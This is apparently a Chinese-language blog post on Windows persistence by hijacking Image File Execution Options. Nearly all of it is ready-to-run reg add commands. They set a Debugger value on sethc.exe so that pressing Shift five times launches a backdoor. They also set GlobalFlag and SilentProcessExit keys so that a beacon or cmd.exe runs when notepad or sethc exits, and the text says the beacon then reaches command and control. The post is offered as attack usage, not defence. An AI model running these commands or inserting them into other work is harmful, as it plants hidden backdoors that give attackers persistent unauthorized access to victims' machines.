---
title: Persistence Image File Execution Options
date: 2023-09-13T17:15:29+08:00
draft: false
url: /posts/2023-09-13/Image-File-Execution-Options
tags:
  - Windows
  - Persistence
  - Image-File-Execution-Options
---

## 0x00 前言

Persistence Image File Execution Options

## 0x01 Image File Execution Options

### 映像劫持

通过修改注册表路径IFEO（Image File Execution Options）的exe程序，然后进行重定向执行后门程序的过程

### 修改Debugger值

1. 运行某exe程序时候，系统会在注册表`Image File Execution Options`中寻找是否存在exe的项

```cmd
# 注册表路径
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

2. 在IFEO中新添加一个项，取名sethc.exe

```cmd
# Usage
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
```

3. 新建一个字符串值Debugger，键值修改为后门存在的路径表，连续五次shitf触发sethc.exe程序，系统就会重定向到指定路径，执行beacon.exe成功上线

```cmd
# Usage
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "<path to executable>" /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Users\Administrator\Downloads\22.exe" /f
```

### GlobalFlag

`GlobalFlag` 注册表项中的十六进制值`0x200`启用进程的静默退出监视

ReportingMode 注册表项启用 Windows 错误报告进程 (WerFault.exe)，该进程将是“ **MonitorProcess** ” beacon.exe 的父进程。当记事本进程被终止时（用户已关闭记事本应用程序），有效负载将被执行，并且将与命令和控制建立通信。这将导致系统创建一个名为“ **WerFault.exe** ”的新进程，用于跟踪与操作系统、Windows 功能和应用程序相关的错误。有效负载将作为 Windows 错误报告（**WerFault.exe** ) 的子进程启动

```cmd
# Usage
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "<path to executable>"

# 记事本退出之后运行cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\Windows\System32\cmd.exe"

# 劫持shitf
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe" /v MonitorProcess /t REG_SZ /d "C:\beacon.exe" /f
```
